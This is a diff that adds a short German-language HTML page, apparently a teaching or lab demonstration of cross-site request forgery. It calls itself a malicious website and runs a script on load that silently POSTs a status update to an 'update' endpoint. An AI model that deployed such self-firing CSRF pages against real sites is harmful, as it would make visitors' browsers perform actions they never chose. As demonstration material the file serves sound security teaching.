@@ -1,0 +1,22 @@
+<html>
+<head>
+	<title>CSRF-Angreifer</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+</head>
+<body>
+<p>Vielen Dank, dass Sie unsere boesartige Webseite besucht haben!</p>
+
+
+<!-- CSRF über POST -->
+
+<script type="text/javascript">
+var xmlHttp = new XMLHttpRequest();
+if (xmlHttp) {
+	xmlHttp.open('POST', 'update', true);
+	xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xmlHttp.send("author=CSRF&status=" + escape("CSRF-Angriff per POST"));
+}
+</script>
+
+</body>
+</html>
